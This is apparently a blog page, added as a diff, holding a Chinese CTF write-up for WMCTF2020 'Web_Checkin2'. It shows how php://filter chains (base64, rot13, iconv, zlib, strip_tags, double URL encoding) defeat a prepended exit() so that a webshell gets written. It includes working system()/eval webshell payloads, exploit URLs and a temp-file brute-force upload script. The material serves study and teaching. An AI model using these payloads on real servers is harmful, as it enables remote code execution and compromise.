@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>WMCTF2020_Web_Checkin2之PHP利用filter过滤器绕过exit | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">WMCTF2020_Web_Checkin2之PHP利用filter过滤器绕过exit</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-08-12&nbsp;&nbsp;12:57:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>前两天看WMCTF2020的一道签到题，题目是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">'/var/www/html/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64/i'</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">'&lt;?php exit();'</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里最吸引人注意力的是最后的file_put_contents中的<code>&lt;?php exit();</code>，虽然$content是我们可控的，但是无论写入什么，前面都会有<code>&lt;?php exit();</code>阻止后面的代码执行。</p>
+<p>另一个点是file_put_contents，第一个参数是要被写入数据的文件名 ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents ( string $filename , mixed $data [, int $flags = <span class="number">0</span> [, resource $context ]] ) : int</span><br></pre></td></tr></table></figure>
+
+<p>如果直接构造webshell，那么文件名会变得很奇怪。这是我第一次看到这到题的想法。</p>
+<p>上面的问题中，最重要的就是如何绕过<code>exit</code>，这个问题其实在2009年就已经在 <a href="https://www.sektioneins.de/advisories/advisory-032009-piwik-cookie-unserialize-vulnerability.html" target="_blank" rel="noopener">https://www.sektioneins.de/advisories/advisory-032009-piwik-cookie-unserialize-vulnerability.html</a>  被SektionEins GmbH解决了。是SektionEins GmbH在研究piwik的一个反序列化漏洞时遇到的问题，piwik的作者为了提高程序的安全性，在配置文件中加入了<code>&lt;?php exit;</code>来防止攻击者写入恶意代码并执行，这也是很多php开发者会采取的一种常见的安全措施：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/21.png" alt="21"></p>
+<p>SektionEins GmbH指出，可以通过php://filter过滤器来绕过死亡exit。</p>
+<p>而ph牛在他的一篇博客中也详细的描述了这个方法，所以以下的部分内容从ph牛的博客中摘取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;php-filter-magic.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="情况一-2个变量"><a href="#情况一-2个变量" class="headerlink" title="情况一 2个变量"></a>情况一 2个变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br></pre></td></tr></table></figure>
+
+<p>根据php://filter官方手册，可以借助php://filter向文件写入数据，<a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php.php</a>  ：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/1.png" alt="1"></p>
+<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>第一种方法是利用base64编码，base64编码中只包含64个可打印的字符，即<code>[A-Za-z0-9+/]</code>，遇到非法的字符如<code>$</code>则会跳过，仅从其中挑出合法的字符进行base64解码。</p>
+<p><code>$content</code>是<code>&lt;?php exit;?&gt;</code>和用户可控输入的拼接结果，所以可以传入一串base64编码后的字符串，然后利用php://filter/write=convert.base64-decode 对其进行解码，因为<code>&lt;?;&gt;和空格</code>在base64解码的过程中都是非法字符，所以最后只会对<code>phpexit</code>这7个字符进行解码。</p>
+<p>需要注意的一点是在base64是以4个byte为一组进行解码，<code>phpexit</code>一共七个字符，所以需要补充一个字符，否则我们传入的base64编码后的webshell将会被拿来补充这一个字节的空位，从而导致写入的webshell乱码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs  &#x3D;&#x3D;&#x3D;base64encode&#x3D;&#x3D;&#x3D;&gt;  &lt;?php system($_GET[1]);</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">txt&#x3D;aPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs&#x3D;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/2.png" alt="2"></p>
+<h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h3><p>另一种方法是使用strip_tags函数：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/10.png" alt="10"></p>
+<p>利用strip_tags函数去除<code>&lt;?php exit;?&gt;</code>字符串。</p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> readfile(<span class="string">'php://filter/read=string.strip_tags/resource=php://input'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/3.png" alt="3"></p>
+<p>可以看到的是<code>&lt;?php exit;?&gt;</code>整个字符串都被去除了。但是如果我们直接传入我们的webshell，比如<code>&lt;?php phpinfo();?&gt;</code>，因为同样包含php标记，所以也会被直接去除。所以直接明文传输webshell肯定不行。幸而php://filter是支持多个过滤器的，所以可以将webshell进行base64编码，然后利用strip_tags先去除<code>&lt;?php exi?&gt;</code>后再利用conver.base64-decode过滤器进行解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">txt&#x3D;PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs&#x3D;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell2.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/4.png" alt="4"></p>
+<h3 id="rot13编码"><a href="#rot13编码" class="headerlink" title="rot13编码"></a>rot13编码</h3><p>另外一种方法是利用rot13编码。rot13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。对于<code>&lt;?php exit;?&gt;</code>中的非字母字符则会忽略，经过rot13编码后结果为：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/11.png" alt="11"></p>
+<p>最终的利用方式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;  &#x3D;&#x3D;&#x3D;rot13&#x3D;&#x3D;&#x3D;&gt;  &lt;?cuc cucvasb(); ?&gt;</span><br><span class="line"></span><br><span class="line">txt&#x3D;&lt;?cuc cucvasb(); ?&gt;&amp;filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;shell3.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/5.png" alt="5"></p>
+<p>当然如果开启了<code>short_open_tag</code>，那php解释器就会因为无法解释执行<code>&lt;?cuc rkvg;?&gt;</code>而报错了，所以rot13编码的使用前提是不开启<code>short_open_tag</code>。</p>
+<h2 id="情况二-1个变量"><a href="#情况二-1个变量" class="headerlink" title="情况二 1个变量"></a>情况二 1个变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($a,<span class="string">"&lt;?php exit;"</span>.$a);</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，只有一个可控变量<code>$a</code>，此时我们构造的shell可以放在过滤器的位置，当php://filter遇到不认识的规则会报Warning，然后继续执行。</p>
+<h3 id="base64编码（not-work）"><a href="#base64编码（not-work）" class="headerlink" title="base64编码（not work）"></a>base64编码（not work）</h3><p>在这种情况下，base64编码并不适用。原因是base64一般会认为<code>=</code>号是编码结束的符号，而在我们构造的php://filter过滤器中会出现多个<code>=</code>。</p>
+<h3 id="rot13编码-1"><a href="#rot13编码-1" class="headerlink" title="rot13编码"></a>rot13编码</h3><p>rot13编码是一种很好的去除<code>&lt;?php exit;?&gt;</code>的方式，和情况1的利用方式一样构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc cucvasb();?&gt;&#x2F;resource&#x3D;shell3.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/6.png" alt="6"></p>
+<p>访问shell3.php，在<code>short_open_tag</code>关闭的情况下，虽然源码中有无关的部分，但是能正常执行<code>&lt;?php phpinfo();?&gt;</code></p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/7.png" alt="7"></p>
+<h3 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a>iconv字符编码转换</h3><p>另一种方法是使用iconv过滤器，本质思想和rot13是一样的，将<code>&lt;?php exit;?&gt;</code>通过字符转换转成php解析器无法解析的字符，在<code>short_open_tags</code>关闭的情况下就能够绕过死亡exit。</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/8.png" alt="8"></p>
+<p>一种方式是利用UCS-2：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/14.png" alt="14"></p>
+<p>然后用php://filter对其进行解码就可以绕过<code>&lt;?php exit;?&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/9.png" alt="9"></p>
+<p>写入的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>r/seuocr=ehsle.lhp</span><br></pre></td></tr></table></figure>
+
+<p>除了UCS-2之外，还可以利用UCS-4，都需要注意的是，这两种方式都是对字符串进行2/4位反转，所以我们在构造的时候就要构造2（UCS-2）或是4（UCS-4）的倍数。</p>
+<p>比如对于UCS-4，我们要进行补位，否则在编码或是解码的时候会报错：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/15.png" alt="15"></p>
+<p>需要在<code>?&lt;aa phpiphp(ofn&gt;?;)</code>之前保持字符个数是4的倍数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;  &#x3D;&#x3D;&gt; 11</span><br><span class="line"></span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE|  &#x3D;&#x3D;&gt; 44</span><br><span class="line"></span><br><span class="line">补充一个1个字符x，最后得到</span><br><span class="line"></span><br><span class="line">$a &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE|x?&lt;aa phpiphp(ofn&gt;?;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/16.png" alt="16"></p>
+<p>最后写入的内容是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp?&lt;xe pp;ti/:phlif<span class="comment">//retnoc/trevoci.U.vn4-SCU.EL4-SCx|EBaa<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>ser/cruohs=e4llephp.</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="WMCTF2020-Web-Checkin2"><a href="#WMCTF2020-Web-Checkin2" class="headerlink" title="WMCTF2020-Web_Checkin2"></a>WMCTF2020-Web_Checkin2</h2><p>回到题目本身，这显然是属于第2种情况：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">'/var/www/html/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64/i'</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">'&lt;?php exit();'</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是对$content变量进行了过滤，过滤了<code>/iconv|UCS|UTF|rot|quoted|base64/i</code>，此时有两种方法可以绕过：</p>
+<ol>
+<li>二次编码</li>
+<li>过滤器绕过</li>
+</ol>
+<h3 id="方法一-二次编码绕过"><a href="#方法一-二次编码绕过" class="headerlink" title="方法一 二次编码绕过"></a>方法一 二次编码绕过</h3><p>php://filter在识别过滤器的时候，会对其进行url解码：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/18.png" alt="18"></p>
+<p>传入<code>string.%72ot13</code>会被再次解码：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/19.png" alt="19"></p>
+<p>而在<code>$_GET</code>请求中也会解码一次，所以选择过滤器rot13，可以将<code>r</code>字符进行二次编码绕过（<code>%25</code>是<code>%</code>符号的url编码结果）。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.247.130&#x2F;index.php?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.%2572ot13|&lt;?cuc @riny($_TRG[_]);?&gt;&#x2F;resource&#x3D;..&#x2F;b.php</span><br><span class="line"></span><br><span class="line">view-source:http:&#x2F;&#x2F;192.168.247.130&#x2F;b.php?_&#x3D;system(%27cat%20&#x2F;fffffllllllllaaaaaggggggg_as89c79as8%27);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/17.png" alt="17"></p>
+<p>这里第一个请求中写入的文件是<code>../b.php</code>，因为当前并不在<code>/var/www/html</code>根目录下执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sandbox = <span class="string">'/var/www/html/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二-过滤器绕过"><a href="#方法二-过滤器绕过" class="headerlink" title="方法二 过滤器绕过"></a>方法二 过滤器绕过</h3><p>虽然过滤了很多过滤器，但是还剩下<code>zlib</code>和<code>string</code>，所以官方题解给出的另一种方案是利用<code>zlib</code>的<code>zlib.deflate</code>（压缩）和<code>zlib.inflate</code>（解压）以及<code>string.tolower</code>来绕过。</p>
+<p>直接使用zlib.deflate和zlib.inflate肯定没有效果，所以在中间需要再利用一个过滤器去除掉<code>&lt;?php exit();</code>，写了一个test case进行测试，看什么时候中间的过滤器会影响inflate的操作：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php"</span>;</span><br><span class="line">file_put_contents($a,<span class="string">"&lt;?php exit();"</span>.$a);</span><br></pre></td></tr></table></figure>
+
+<p>发现当过滤器为<code>string.tolower</code>时，会将其中的<code>&lt;?php exit;</code>部分处理掉。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.247.130&#x2F;index.php?content&#x3D;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0deval($_GET[1]);?%3E&#x2F;resource&#x3D;..&#x2F;a.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.247.130&#x2F;a.php?1&#x3D;system(%27ls%20&#x2F;%27);</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.247.130&#x2F;a.php?1&#x3D;system(%27cat%20&#x2F;fffffllllllllaaaaaggggggg_as89c79as8%27);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/20.png" alt="20"></p>
+<h3 id="方法三-爆破临时文件"><a href="#方法三-爆破临时文件" class="headerlink" title="方法三 爆破临时文件"></a>方法三 爆破临时文件</h3><p>根据官方给出的wp，还有一种方法是爆破临时文件。环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以老问题，利用string.strip_tags会发生段错误，这时候上传一个shell会以临时文件的形式保存在/tmp中，利用require_once包含getshell即可（用一次就会被覆盖，所以直接反弹shell或者写马就行）。爆破脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> itertools </span><br><span class="line"> </span><br><span class="line">charset = string.digits + string.letters </span><br><span class="line"></span><br><span class="line">host = <span class="string">"web_checkin2.wmctf.wetolink.com"</span> </span><br><span class="line">port = <span class="number">80</span> </span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span> </span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125; </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        response = requests.post(url, files=files) </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">        <span class="keyword">print</span> e </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span> </span><br><span class="line">    file_content = <span class="string">'&lt;?php system("xxxxxxxx");?&gt;'</span> </span><br><span class="line">    phpinfo_url = <span class="string">"%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php"</span> % ( </span><br><span class="line">        base_url) </span><br><span class="line">    <span class="keyword">print</span> phpinfo_url </span><br><span class="line">    length = <span class="number">6</span> </span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times): </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times) </span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>: </span><br><span class="line">    generate_tmp_files()</span><br></pre></td></tr></table></figure>
+
+<p>但是还没测试，因为还需要特别搭建环境进行测试。</p>
+<h2 id="php-filter与不可用规则"><a href="#php-filter与不可用规则" class="headerlink" title="php://filter与不可用规则"></a>php://filter与不可用规则</h2><p>php://filter在遇到不可用的规则的时候是会抛出一个warning，并且不会影响后面的程序继续执行，对源码进行了一个调试：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.strip_tags|PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/resource=http://www.example.com"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其中包含任意字符串<code>PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs</code></p>
+<p>在第160行和第163行会分别抛出一个warning：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/13.png" alt="13"></p>
+<p>跟入函数<code>php_stream_filter_create()</code>：</p>
+<p><img src="/2020/08/12/[WMCTF2020]Web_Checkin2-PHP%E7%BB%95%E8%BF%87exit/imgs/12.png" alt="12"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
